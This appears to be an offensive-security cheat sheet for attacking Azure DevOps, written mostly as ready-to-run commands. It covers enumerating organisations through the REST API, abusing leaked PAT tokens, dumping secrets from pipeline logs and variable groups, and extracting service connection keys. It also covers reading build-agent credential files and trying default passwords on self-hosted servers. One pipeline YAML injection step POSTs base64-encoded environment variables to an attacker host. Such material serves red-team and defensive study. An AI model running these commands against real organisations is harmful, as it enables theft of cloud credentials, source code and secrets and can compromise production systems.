# Azure DevOps (ADO)

## What is it?
Azure DevOps (ADO) is Microsoft's DevOps platform — includes Repos (Git), Pipelines (CI/CD), Boards (work items), Artifacts (package registry), and Test Plans. Extremely high-value target: CI/CD pipelines run code, service connections hold cloud credentials, repos contain source code and secrets, and pipeline agents often have privileged access to production environments.

Deployment:
- **Azure DevOps Services** — cloud (dev.azure.com)
- **Azure DevOps Server** (TFS) — self-hosted (2019/2020/2022)

---

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 443 | TCP | Azure DevOps Services (cloud) |
| 8080 | TCP | ADO Server default HTTP |
| 8443 | TCP | ADO Server default HTTPS |
| 22 | TCP | SSH for Git (cloud: ssh.dev.azure.com) |

---

## Enumeration

```bash
# Enumerate organization from known URL
# Cloud: https://dev.azure.com/<org>
# Self-hosted: https://<server>/<collection>

# List all projects in an organization (may be public)
curl -sk "https://dev.azure.com/<org>/_apis/projects?api-version=7.0"

# With credentials
curl -sk "https://dev.azure.com/<org>/_apis/projects?api-version=7.0" \
  -u ":<PAT-token>"

# List repos in a project
curl -sk "https://dev.azure.com/<org>/<project>/_apis/git/repositories?api-version=7.0" \
  -u ":<PAT>"

# List pipelines
curl -sk "https://dev.azure.com/<org>/<project>/_apis/pipelines?api-version=7.0" \
  -u ":<PAT>"

# List service connections (cloud credentials — high value)
curl -sk "https://dev.azure.com/<org>/<project>/_apis/serviceendpoint/endpoints?api-version=7.0" \
  -u ":<PAT>"

# List variable groups (often contain secrets)
curl -sk "https://dev.azure.com/<org>/<project>/_apis/distributedtask/variablegroups?api-version=7.0" \
  -u ":<PAT>"

# Enumerate build/release artifacts
curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds?api-version=7.0" \
  -u ":<PAT>" | jq '.value[] | {id:.id, buildNumber:.buildNumber, status:.status}'

# Shodan
http.title:"Azure DevOps Server" product:"Microsoft-IIS"
```

---

## PAT Token Discovery & Abuse

PAT (Personal Access Tokens) are the primary credential type in ADO. Scoped or full-access.

```bash
# PAT token format: 52-character base64 string
# Example: abc123...xyz (52 chars)

# Test a PAT token
curl -sk "https://dev.azure.com/<org>/_apis/projects?api-version=7.0" \
  -u ":<PAT>" | jq '.count'

# Check PAT scope/permissions
curl -sk "https://vssps.dev.azure.com/<org>/_apis/tokens/pats?api-version=7.1-preview.1" \
  -u ":<PAT>"

# Common locations for leaked PAT tokens
# - Git repos (.env, config files, CI scripts)
# - Build logs (printed accidentally)
# - Azure Pipelines YAML committed to repo
# - Docker image layers (docker history)
# - Environment variables on build agents

# Search git history for PAT tokens
git log --all -p | grep -iE "ADO|devops|dev.azure.com|System.AccessToken|PAT|[A-Za-z0-9]{52}"

# TruffleHog scan for secrets in ADO repos
trufflehog git https://dev.azure.com/<org>/<project>/_git/<repo> --only-verified

# GitLeaks
gitleaks detect --source . --report-format json

# Search code for PAT via ADO Search API
curl -sk "https://almsearch.dev.azure.com/<org>/<project>/_apis/search/codesearchresults?api-version=7.0" \
  -u ":<PAT>" \
  -H "Content-Type: application/json" \
  -d '{"searchText":"System.AccessToken","$skip":0,"$top":50}'
```

---

## Pipeline Secret Extraction

### Via Pipeline Logs

```bash
# List recent builds and download logs
curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds?api-version=7.0&\$top=20" \
  -u ":<PAT>" | jq '.value[] | {id:.id, buildNumber:.buildNumber}'

# Get log list for a build
curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds/<build-id>/logs?api-version=7.0" \
  -u ":<PAT>"

# Download specific log file
curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds/<build-id>/logs/<log-id>?api-version=7.0" \
  -u ":<PAT>"

# Search logs for leaked secrets
for build_id in $(curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds?api-version=7.0&\$top=50" -u ":<PAT>" | jq '.value[].id'); do
  logs=$(curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds/$build_id/logs?api-version=7.0" -u ":<PAT>" | jq '.count')
  for i in $(seq 1 $logs); do
    curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds/$build_id/logs/$i?api-version=7.0" -u ":<PAT>" | \
      grep -iE "password|secret|token|key|credential|apikey" && echo "Found in build $build_id log $i"
  done
done
```

### Via Variable Groups

```bash
# List variable groups — secrets marked isSecret:true have redacted values in API
# But: pipeline execution can print them if poorly written

curl -sk "https://dev.azure.com/<org>/<project>/_apis/distributedtask/variablegroups?api-version=7.0" \
  -u ":<PAT>" | jq '.value[] | {name:.name, variables:.variables}'

# Get specific variable group (non-secret values readable)
curl -sk "https://dev.azure.com/<org>/<project>/_apis/distributedtask/variablegroups/<id>?api-version=7.0" \
  -u ":<PAT>" | jq '.variables | to_entries[] | {name:.key, value:.value.value, secret:.value.isSecret}'

# If you can run a pipeline — inject a step to print all env vars
# In YAML pipeline:
# - script: env | sort
#   displayName: 'Dump env'
# Pipeline env includes all secret variable group values at runtime
```

### Via Pipeline YAML Injection

```bash
# If you have write access to a repo connected to a pipeline:
# Modify azure-pipelines.yml to exfil secrets

# Add this step to the pipeline YAML:
cat >> azure-pipelines.yml << 'EOF'
- script: |
    curl -s -X POST https://<attacker>/collect \
      -d "$(env | base64)"
    printenv | grep -i "secret\|token\|key\|password"
  displayName: 'Debug'
  env:
    MY_SECRET: $(secret-variable-name)
EOF

# Or print $(System.AccessToken) — the pipeline OAuth token
# Has permissions based on job authorization scope
cat >> azure-pipelines.yml << 'EOF'
- script: echo "Token: $(System.AccessToken)"
  env:
    SYSTEM_ACCESSTOKEN: $(System.AccessToken)
EOF

# System.AccessToken permissions (scope: Project Collection Build Service)
# - Read/write code
# - Read builds
# - May have access to other projects depending on org settings
```

---

## Service Connection Abuse

Service connections store credentials for external systems (Azure subscriptions, AWS, Docker Hub, etc.) — the crown jewels of ADO.

```bash
# List all service connections (requires admin or appropriate permission)
curl -sk "https://dev.azure.com/<org>/<project>/_apis/serviceendpoint/endpoints?api-version=7.0" \
  -u ":<PAT>" | jq '.value[] | {id:.id, name:.name, type:.type, url:.url}'

# Get details of specific service connection
curl -sk "https://dev.azure.com/<org>/<project>/_apis/serviceendpoint/endpoints/<id>?api-version=7.0" \
  -u ":<PAT>"

# Service connection types to look for:
# AzureRM — Azure subscription access (Service Principal)
# AWSServiceEndpoint — AWS access keys
# dockerRegistry — Docker Hub / ACR credentials
# kubernetes — Kubernetes cluster access
# ssh — SSH private key
# generic — username/password to arbitrary service

# Extract Azure Service Principal details (if accessible)
curl -sk "https://dev.azure.com/<org>/<project>/_apis/serviceendpoint/endpoints/<id>?api-version=7.0&includeDetails=true" \
  -u ":<PAT>" | jq '{tenantId:.authorization.parameters.tenantid, clientId:.authorization.parameters.serviceprincipalid, spnKey:.authorization.parameters.serviceprincipalkey}'

# Use pipeline to exfil service connection credentials:
# Create pipeline that uses service connection + prints auth tokens
cat > pipeline-exfil.yml << 'EOF'
trigger: none
pool:
  vmImage: ubuntu-latest
steps:
- task: AzureCLI@2
  inputs:
    azureSubscription: '<service-connection-name>'
    scriptType: bash
    scriptLocation: inlineScript
    inlineScript: |
      az account show
      az account get-access-token
      env | grep AZURE
EOF
```

---

## Repository Secret Scanning

```bash
# Clone all repos in an organization
curl -sk "https://dev.azure.com/<org>/<project>/_apis/git/repositories?api-version=7.0" \
  -u ":<PAT>" | jq -r '.value[].remoteUrl' | while read url; do
    reponame=$(basename $url .git)
    git clone "https://:<PAT>@${url#https://}" ./repos/$reponame 2>/dev/null
done

# Search cloned repos for secrets
trufflehog filesystem ./repos/ --only-verified --json

# gitleaks across all repos
gitleaks detect --source ./repos/ --report-format json --report-path secrets.json

# Manual search patterns
grep -r -iE "password\s*=|secret\s*=|api_key\s*=|apikey\s*=|token\s*=|aws_access" ./repos/ \
  --include="*.yml" --include="*.yaml" --include="*.env" --include="*.json" --include="*.tf"

# Search git history (not just current state)
for repo in ./repos/*/; do
  echo "=== $repo ==="
  git -C "$repo" log --all -p -- '*.yml' '*.yaml' '*.env' '*.json' | \
    grep -iE "password|secret|token|apikey|aws_access" | head -20
done

# ADO Search API — search all code across org
curl -sk -X POST "https://almsearch.dev.azure.com/<org>/_apis/search/codesearchresults?api-version=7.0" \
  -u ":<PAT>" \
  -H "Content-Type: application/json" \
  -d '{
    "searchText": "password",
    "filters": {"Project": ["<project>"]},
    "$skip": 0,
    "$top": 100,
    "includeFacets": false
  }' | jq '.results[] | {file:.path, project:.project.name, content:.matches}'
```

---

## Build Agent Compromise

Self-hosted build agents run pipeline jobs on machines in the customer's network — often with broad access to production.

```bash
# Identify self-hosted agents
curl -sk "https://dev.azure.com/<org>/_apis/distributedtask/pools?api-version=7.0" \
  -u ":<PAT>" | jq '.value[] | {name:.name, poolType:.poolType}'

curl -sk "https://dev.azure.com/<org>/_apis/distributedtask/pools/<pool-id>/agents?api-version=7.0" \
  -u ":<PAT>" | jq '.value[] | {name:.name, status:.status, ip:.systemCapabilities."Agent.ComputerName"}'

# Agent config file location (if you compromise the agent machine)
# Linux: ~/myagent/_work/_tool/ , /home/vsts/agent/ , /opt/vsts/agent/
# Windows: C:\agent\  C:\vsts-agent\  C:\azagent\

# Agent credential files — contains PAT or service account creds
cat ~/myagent/.credentials    # Linux
# Windows: %USERPROFILE%\myagent\.credentials

# Agent work directory — contains all checked-out repos + env variable files
ls ~/myagent/_work/
# Each build leaves behind:
# _work/<build-id>/s/    — source code checkout
# _work/<build-id>/a/    — artifacts
# _work/<build-id>/r/    — resources

# Search agent work dir for secrets left by builds
grep -r -iE "password|secret|token|apikey" ~/myagent/_work/ --include="*.env" --include="*.json"

# If agent runs as domain service account:
whoami /all          # check privileges + group memberships
net user /domain     # enumerate domain users from agent
# Agent service accounts often have access to:
# - Deployment servers
# - Azure subscriptions (via managed identity)
# - Internal artifact feeds / NuGet / npm

# Pipeline agent hijack — if you can trigger a pipeline:
# Create pipeline that runs commands on the agent's machine
# Agent runs as LocalSystem or a service account — pivot from there
```

---

## ADO REST API — Useful Endpoints

```bash
BASE="https://dev.azure.com/<org>"
PAT="<pat-token>"
AUTH="-u :$PAT"
PROJECT="<project>"

# Organizations
curl -sk "https://app.vssps.visualstudio.com/_apis/accounts?api-version=7.0" $AUTH

# Projects
curl -sk "$BASE/_apis/projects?api-version=7.0" $AUTH

# Users (org-level)
curl -sk "https://vssps.dev.azure.com/<org>/_apis/graph/users?api-version=7.1-preview.1" $AUTH | \
  jq '.value[] | {display:.displayName, email:.mailAddress}'

# Groups
curl -sk "https://vssps.dev.azure.com/<org>/_apis/graph/groups?api-version=7.1-preview.1" $AUTH

# Repos
curl -sk "$BASE/$PROJECT/_apis/git/repositories?api-version=7.0" $AUTH | jq '.value[].name'

# Branches (per repo)
curl -sk "$BASE/$PROJECT/_apis/git/repositories/<repo-id>/refs?filter=heads&api-version=7.0" $AUTH

# Pipelines
curl -sk "$BASE/$PROJECT/_apis/pipelines?api-version=7.0" $AUTH | jq '.value[] | {id:.id, name:.name}'

# Pipeline runs
curl -sk "$BASE/$PROJECT/_apis/pipelines/<pipeline-id>/runs?api-version=7.0" $AUTH

# Releases
curl -sk "$BASE/$PROJECT/_apis/release/releases?api-version=7.0" \
  -H "Accept: application/json" \
  -u ":$PAT" 2>/dev/null

# Work items (boards/tickets — may contain credentials)
curl -sk "$BASE/$PROJECT/_apis/wit/workitems?\$filter=System.WorkItemType='Task'&api-version=7.0" $AUTH

# Artifact feeds (package registries)
curl -sk "https://feeds.dev.azure.com/<org>/_apis/packaging/feeds?api-version=7.0" $AUTH
```

---

## ADO Server (Self-Hosted) Specifics

```bash
# ADO Server (on-premises TFS/Azure DevOps Server)
SERVER="https://<server>/<collection>"

# Default credentials to try
# admin:admin  administrator:password  tfsadmin:tfsadmin

# Check if IWA (Integrated Windows Authentication) enabled — NTLM negotiate
curl -sk "$SERVER/_apis/projects" -v 2>&1 | grep -i "WWW-Authenticate"

# NTLM auth with domain creds
curl -sk "$SERVER/_apis/projects?api-version=7.0" \
  --ntlm -u "DOMAIN\\username:password"

# ADO Server admin panel
curl -sk "https://<server>/<collection>/_admin"
curl -sk "https://<server>/<collection>/_admin/_home/index"

# SQL Server backend — ADO Server stores data in SQL Server
# Config file: %ProgramFiles%\Azure DevOps Server <version>\Application Tier\Web Services\web.config
# Connection string in: %ProgramData%\Microsoft\Azure DevOps\Configuration\ApplicationTier.xml
# Contains: SQL Server hostname, database name, service account

# IIS hosting — check for misconfigs
iisreset /status
netsh http show urlacl
```

---

## Dangerous Configurations

| Config | Risk |
|--------|------|
| PAT with full access scope | Single token = full org access |
| Public project visibility | Unauthenticated repo/pipeline access |
| Service connections not restricted to pipelines | Anyone with PAT can use cloud creds directly |
| `Allow scripts to access OAuth token` enabled + broad job auth scope | Pipeline token can modify any repo |
| Self-hosted agents running as SYSTEM or domain admin | Pipeline job = domain admin shell |
| Variable groups shared across projects without restriction | Cross-project secret access |
| Build logs retaining secret values | Historical log search reveals credentials |
| Git repos with no branch protection | Direct push to main with malicious code |
| Agent machines accessible to broad pipeline permissions | Any contributor can run code on production hosts |
| Artifact feeds without upstream filtering | Supply chain attack via malicious packages |

---

## Quick Reference

```bash
# Test PAT token
curl -sk "https://dev.azure.com/<org>/_apis/projects?api-version=7.0" -u ":<PAT>"

# List all repos
curl -sk "https://dev.azure.com/<org>/<project>/_apis/git/repositories?api-version=7.0" -u ":<PAT>" | jq '.value[].name'

# List service connections (cloud creds)
curl -sk "https://dev.azure.com/<org>/<project>/_apis/serviceendpoint/endpoints?api-version=7.0" -u ":<PAT>" | jq '.value[] | {name:.name, type:.type}'

# List variable groups (secrets)
curl -sk "https://dev.azure.com/<org>/<project>/_apis/distributedtask/variablegroups?api-version=7.0" -u ":<PAT>" | jq '.value[].name'

# Build log dump — search for leaked secrets
curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds/<id>/logs/<log-id>?api-version=7.0" -u ":<PAT>" | grep -iE "secret|token|password|key"

# Clone all repos
curl -sk "https://dev.azure.com/<org>/<project>/_apis/git/repositories?api-version=7.0" -u ":<PAT>" | \
  jq -r '.value[].remoteUrl' | xargs -I{} git clone "https://:<PAT>@{#https://}"

# Search code for secrets
curl -sk -X POST "https://almsearch.dev.azure.com/<org>/_apis/search/codesearchresults?api-version=7.0" \
  -u ":<PAT>" -H "Content-Type: application/json" \
  -d '{"searchText":"password","$skip":0,"$top":50}'
```
